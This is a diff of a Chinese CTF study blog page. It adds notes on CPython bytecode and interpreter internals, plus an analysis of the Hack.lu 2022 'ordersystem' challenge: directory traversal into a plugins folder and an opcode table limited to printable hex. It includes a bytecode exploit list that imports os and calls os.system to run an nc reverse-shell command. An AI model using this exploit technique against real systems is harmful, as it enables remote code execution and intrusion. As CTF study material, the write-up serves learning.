@@ -24,11 +24,12 @@
 <meta property="og:description" content="让我逝逝这些CTF">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20221026212243834.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-20T02:30:33.554Z">
+<meta property="article:modified_time" content="2022-11-21T01:35:24.720Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -215,7 +216,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      78k 字
+      79k 字
     </span>
   
 
@@ -224,7 +225,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      979 分钟
+      992 分钟
     </span>
   
 
@@ -265,7 +266,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年11月20日 上午
+                  不可视境界线最后变动于：2022年11月21日 上午
                 
               </p>
             
@@ -663,7 +664,7 @@
 </li>
 </ul>
 <h3 id="Python-relevant"><a href="#Python-relevant" class="headerlink" title="Python relevant:"></a>Python relevant:</h3><blockquote>
-<p>python编译系统内部原理, 暂时可以不用关注:</p>
+<p>python编译系统内部原理, 暂时可以不用关注: 不看啥也不知道, 又滚回来看了…</p>
 <ul>
 <li>stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a target="_blank" rel="noopener" href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li>
 <li>Wiki: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul>
@@ -672,8 +673,13 @@
 <li>开始看到上下文无关语法等等, 快死去的记忆开始攻击我. 一时看不完wiki, 找点浅显易懂的文章来. <a target="_blank" rel="noopener" href="https://users.ece.cmu.edu/~koopman/stack_computers/sec3_2.html">stackmachine book</a> | <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/stack-machine-in-computer-organisation/">Geek</a> </li>
 </ul>
 </li>
-<li><a target="_blank" rel="noopener" href="https://devguide.python.org/internals/compiler/index.html">python compiler design</a> : 这里面好多, 但是看起挺有用…..不知道要不要看. </li>
-<li><a target="_blank" rel="noopener" href="https://tech.blog.aknin.name/category/my-projects/pythons-innards/">python innards</a> : 讲解ceval.c内容. </li>
+<li><a target="_blank" rel="noopener" href="https://devguide.python.org/internals/compiler/index.html">python compiler design</a> : developer官方文档, 这里面好多, 但是看起挺有用…..不知道要不要看. </li>
+<li><a target="_blank" rel="noopener" href="https://tech.blog.aknin.name/category/my-projects/pythons-innards/">python innards</a> : 讲解ceval.c内容. <ul>
+<li><a target="_blank" rel="noopener" href="https://tech.blog.aknin.name/2010/04/02/pythons-innards-introduction/">innards introduction</a> 前置知识, 溜一遍. 可惜就是十年前的终究有点过时. </li>
+</ul>
+</li>
+<li>还要看看python <a target="_blank" rel="noopener" href="https://docs.python.org/3/c-api">C API</a>. </li>
+<li>再开一个主题, 这里不够写(cv)了. </li>
 </ul>
 </blockquote>
 <ul>
@@ -704,9 +710,10 @@
 <li><code>STORE_FAST</code>(<em>var_num</em>): Stores TOS into the local <code>co_varnames[var_num]</code>.</li>
 <li><code>BINARY_ADD</code>: Implements TOS = TOS1 + TOS.</li>
 <li><code>RETURN_VALUE</code> Returns with TOS to the caller of the function.</li>
+<li><strong>可通过dis.opmap查询inst编码. 想了一小时怎么弄…… 第二个字节是操作数, 就是dis结果的第二个数字</strong>. </li>
 </ul>
 </li>
-<li><p>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. <del>啊这? 可能是预留位置防止后来加入东西</del><br>下面是<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. 已下载cpython 3.11源码, 可以看到一些定义之类的东西. </p>
+<li><p>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. <del>啊这? 可能是预留位置防止后来加入东西</del><br>下面是<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. 已下载cpython 3.11源码, 可以看到一些定义之类的东西.  </p>
 </li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//branch 3.11:</span><br>		TARGET(WITH_EXCEPT_START) &#123;<br>            <span class="hljs-comment">/* At the top of the stack are 4 values:</span><br><span class="hljs-comment">               - TOP = exc_info()</span><br><span class="hljs-comment">               - SECOND = previous exception</span><br><span class="hljs-comment">               - THIRD: lasti of exception in exc_info()</span><br><span class="hljs-comment">               - FOURTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call FOURTH(type(TOP), TOP, GetTraceback(TOP)).</span><br><span class="hljs-comment">               Then we push the __exit__ return value.</span><br><span class="hljs-comment">            */</span><br>            PyObject *exit_func;<br>            PyObject *exc, *val, *tb, *res;<br><br>            val = TOP();<br>            assert(val &amp;&amp; PyExceptionInstance_Check(val));<br>            exc = PyExceptionInstance_Class(val);<br>            tb = PyException_GetTraceback(val);<br>            Py_XDECREF(tb);<br>            assert(PyLong_Check(PEEK(<span class="hljs-number">3</span>)));<br>            exit_func = PEEK(<span class="hljs-number">4</span>);<br>            PyObject *<span class="hljs-built_in">stack</span>[<span class="hljs-number">4</span>] = &#123;<span class="hljs-literal">NULL</span>, exc, val, tb&#125;;<br>            res = PyObject_Vectorcall(exit_func, <span class="hljs-built_in">stack</span> + <span class="hljs-number">1</span>,<br>                    <span class="hljs-number">3</span> | PY_VECTORCALL_ARGUMENTS_OFFSET, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (res == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">goto</span> error;<br><br>            PUSH(res);<br>            DISPATCH();<br>        &#125;<br><br><span class="hljs-comment">//but in branch 3.9-10:</span><br>            <span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">               - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">               - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">               - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">               Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">               return value.</span><br><span class="hljs-comment">            */</span><br></code></pre></div></td></tr></table></figure>
@@ -714,7 +721,43 @@
 <ul>
 <li></li>
 </ul>
-<h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a target="_blank" rel="noopener" href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a target="_blank" rel="noopener" href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><ul>
+<h3 id="Python-Innards"><a href="#Python-Innards" class="headerlink" title="Python Innards"></a>Python Innards</h3><blockquote>
+<p>除了python innards, <a target="_blank" rel="noopener" href="https://realpython.com/cpython-source-code-guide">这一篇</a>三年前写的比较新一点. </p>
+</blockquote>
+<ul>
+<li><p>src structure(in Linux platform)</p>
+<ul>
+<li>Include — header files</li>
+<li>Objects — object implementations, from int to type</li>
+<li>Python — interpreter, bytecode compiler and other essential infrastructure</li>
+<li>Parser — parser, lexer and parser generator</li>
+<li>Modules — stdlib extension modules, and main.c </li>
+<li>Programs — not much, but has the real main() function</li>
+</ul>
+<blockquote>
+<p>when it comes to modern windows, lookup <code>PCBuild — Tools to build Python for modern Windows using Visual Studio</code> </p>
+</blockquote>
+</li>
+<li><p>一时不知道要看哪个…先看看最新的这个吧. </p>
+</li>
+<li><p>Grammar is written in BNF. <a target="_blank" rel="noopener" href="https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form">https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form</a> </p>
+</li>
+<li><p>解释器工作流程:</p>
+</li>
+</ul>
+<img src="../../image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png" srcset="/img/loading.gif" lazyload alt="Python run swim lane diagram" style="zoom: 67%;" />
+
+<ul>
+<li></li>
+</ul>
+<h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a target="_blank" rel="noopener" href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a target="_blank" rel="noopener" href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><ul>
+<li>用字典类型<code>ENTRIES</code>来保存输入的信息. 其中key最多12字节, 可以是任意bytes, 但是data只能是printable hex number, 长度为0-255.</li>
+<li>可保存data到storage文件夹中的key(文件名称), 不过可以directory traversal到plugins文件夹中. </li>
+<li>执行plugins时读取相应bytecode文件, 将所有key加上<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>放到codeType的consts中, 其中log函数可做到往<code>./log</code>文件(可更改参数)写入任意数据. 最后<code>exec()</code>执行代码. </li>
+</ul>
+<p>所以要在被限制的代码中多次调用log函数, 把consts中的key当做是msg写入plugins文件夹中. </p>
+<p>docker安装的python版本是3.10.6</p>
+<h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><ul>
 <li><p>because of the hexdump executed by server, we can only send printable hex numbers, which dramatically lessens our options.<br>notice that the code in block is actually a condition statement……….</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> dis<br>   ...: &#123;<br>   ...:     <span class="hljs-built_in">hex</span>(op_code): op_name<br>   ...:     <span class="hljs-keyword">for</span> op_name, op_code <span class="hljs-keyword">in</span> dis.opmap.items()<br>   ...:     <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(op_code) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>   ...: &#125;<br>Out[<span class="hljs-number">1</span>]:<br>&#123;<span class="hljs-string">&#x27;0x31&#x27;</span>: <span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>,<br> <span class="hljs-string">&#x27;0x32&#x27;</span>: <span class="hljs-string">&#x27;GET_AITER&#x27;</span>,<br> <span class="hljs-string">&#x27;0x33&#x27;</span>: <span class="hljs-string">&#x27;GET_ANEXT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x34&#x27;</span>: <span class="hljs-string">&#x27;BEFORE_ASYNC_WITH&#x27;</span>,<br> <span class="hljs-string">&#x27;0x36&#x27;</span>: <span class="hljs-string">&#x27;END_ASYNC_FOR&#x27;</span>,<br> <span class="hljs-string">&#x27;0x37&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_ADD&#x27;</span>,<br> <span class="hljs-string">&#x27;0x38&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_SUBTRACT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x39&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_MULTIPLY&#x27;</span>,<br> <span class="hljs-string">&#x27;0x61&#x27;</span>: <span class="hljs-string">&#x27;STORE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x62&#x27;</span>: <span class="hljs-string">&#x27;DELETE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x63&#x27;</span>: <span class="hljs-string">&#x27;ROT_N&#x27;</span>,<br> <span class="hljs-string">&#x27;0x64&#x27;</span>: <span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>,<br> <span class="hljs-string">&#x27;0x65&#x27;</span>: <span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>,<br> <span class="hljs-string">&#x27;0x66&#x27;</span>: <span class="hljs-string">&#x27;BUILD_TUPLE&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure></li>
 <li><p>but the <code>WITH_EXCEPT_START</code> is something special. </p>
@@ -730,7 +773,7 @@
 </li>
 </ul>
 <h4 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h4><p>?</p>
-<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)<br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>),<br>]<br></code></pre></div></td></tr></table></figure>
+<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)<br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop??</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>),<br>]<br></code></pre></div></td></tr></table></figure>
 
 <p>This performs the following:</p>
 <ol>
